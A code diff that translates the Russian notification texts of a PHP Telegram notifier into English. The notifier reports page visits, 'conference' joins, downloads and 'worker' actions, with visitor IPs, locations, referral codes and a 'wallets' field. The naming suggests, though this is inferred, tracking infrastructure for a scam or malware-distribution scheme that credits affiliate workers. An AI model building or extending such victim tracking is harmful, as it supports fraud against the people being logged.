@@ -46,66 +46,66 @@ class TelegramService
 
     public function notifyPageVisit($type, $reference, $ipAddress, $userAgent = null, $countryInfo = null)
     {
-        $message = "🟦 Переход на страницу\n";
-        $message .= "📱 Устройство: " . $this->detectDevice($userAgent) . "\n";
+        $message = "Page visit\n";
+        $message .= "Device: " . $this->detectDevice($userAgent) . "\n";
         
         if ($countryInfo && isset($countryInfo['country'])) {
-            $message .= "🌍 Гео: " . $ipAddress . " - " . $countryInfo['flag'] . " " . $countryInfo['country'] . "\n";
+            $message .= "Location: " . $ipAddress . " - " . $countryInfo['flag'] . " " . $countryInfo['country'] . "\n";
         } else {
-            $message .= "🌍 Гео: " . $ipAddress . " - " . $this->getCountryFlag($ipAddress) . "\n";
+            $message .= "Location: " . $ipAddress . " - " . $this->getCountryFlag($ipAddress) . "\n";
         }
         
-        $message .= "🔗 Код: " . ($reference ?: 'NO_REF') . "\n";
-        $message .= "🗣 Юзер: " . ($this->extractUsername($userAgent) ?: 'N/A');
+        $message .= "Code: " . ($reference ?: 'NO_REF') . "\n";
+        $message .= "User: " . ($this->extractUsername($userAgent) ?: 'N/A');
 
         return $this->sendMessage($message);
     }
 
     public function notifyConferenceJoin($conferenceTitle, $inviteCode, $ipAddress, $userAgent = null, $countryInfo = null)
     {
-        $message = "🟦 Вход в звонок\n";
-        $message .= "📱 Устройство: " . $this->detectDevice($userAgent) . "\n";
+        $message = "Conference join\n";
+        $message .= "Device: " . $this->detectDevice($userAgent) . "\n";
         
         if ($countryInfo && isset($countryInfo['country'])) {
-            $message .= "🌍 Гео: " . $ipAddress . " - " . $countryInfo['flag'] . " " . $countryInfo['country'] . "\n";
+            $message .= "Location: " . $ipAddress . " - " . $countryInfo['flag'] . " " . $countryInfo['country'] . "\n";
         } else {
-            $message .= "🌍 Гео: " . $ipAddress . " - " . $this->getCountryFlag($ipAddress) . "\n";
+            $message .= "Location: " . $ipAddress . " - " . $this->getCountryFlag($ipAddress) . "\n";
         }
         
-        $message .= "🔗 Код: " . $inviteCode . "\n";
-        $message .= "🗣 Юзер: " . ($this->extractUsername($userAgent) ?: 'N/A');
+        $message .= "Code: " . $inviteCode . "\n";
+        $message .= "User: " . ($this->extractUsername($userAgent) ?: 'N/A');
 
         return $this->sendMessage($message);
     }
 
     public function notifyDownload($type, $reference, $platform, $ipAddress, $userAgent = null, $wallets = null, $countryInfo = null)
     {
-        $message = "🟦 Скачивание\n";
-        $message .= "📱 Устройство: " . ucfirst($platform) . "\n";
+        $message = "Download\n";
+        $message .= "Device: " . ucfirst($platform) . "\n";
         
         if ($countryInfo && isset($countryInfo['country'])) {
-            $message .= "🌍 Гео: " . $ipAddress . " - " . $countryInfo['flag'] . " " . $countryInfo['country'] . "\n";
+            $message .= "Location: " . $ipAddress . " - " . $countryInfo['flag'] . " " . $countryInfo['country'] . "\n";
         } else {
-            $message .= "🌍 Гео: " . $ipAddress . " - " . $this->getCountryFlag($ipAddress) . "\n";
+            $message .= "Location: " . $ipAddress . " - " . $this->getCountryFlag($ipAddress) . "\n";
         }
         
-        $message .= "🔗 Код: " . ($reference ?: 'NO_REF') . "\n";
-        $message .= "🗣 Юзер: " . ($this->extractUsername($userAgent) ?: 'N/A');
+        $message .= "Code: " . ($reference ?: 'NO_REF') . "\n";
+        $message .= "User: " . ($this->extractUsername($userAgent) ?: 'N/A');
 
         return $this->sendMessage($message);
     }
 
     public function notifyWorkerAction($action, $workerName, $details = null)
     {
-        $message = "👤 <b>Действие воркера</b>\n";
-        $message .= "🎯 Действие: " . $action . "\n";
-        $message .= "👨‍💼 Воркер: " . $workerName . "\n";
+        $message = "<b>Worker Action</b>\n";
+        $message .= "Action: " . $action . "\n";
+        $message .= "Worker: " . $workerName . "\n";
         
         if ($details) {
-            $message .= "📝 Детали: " . $details . "\n";
+            $message .= "Details: " . $details . "\n";
         }
         
-        $message .= "⏰ Время: " . now()->format('d.m.Y H:i:s');
+        $message .= "Time: " . now()->format('d.m.Y H:i:s');
 
         return $this->sendMessage($message);
     }
@@ -135,7 +135,6 @@ class TelegramService
 
     private function getCountryFlag($ipAddress)
     {
-        // Простая база флагов по IP (в реальном приложении лучше использовать GeoIP)
         $countryFlags = [
             '105.113.28.2' => '🇳🇬 Nigeria',
             '127.0.0.1' => '🇷🇺 Russia',
@@ -150,7 +149,6 @@ class TelegramService
             }
         }
 
-        // Если IP не найден, возвращаем общий флаг
         return '🌍 Unknown';
     }
 
@@ -160,7 +158,6 @@ class TelegramService
             return null;
         }
 
-        // Попытка извлечь имя пользователя из User Agent
         if (preg_match('/user[:\s]+([a-zA-Z0-9_-]+)/i', $userAgent, $matches)) {
             return $matches[1];
         }
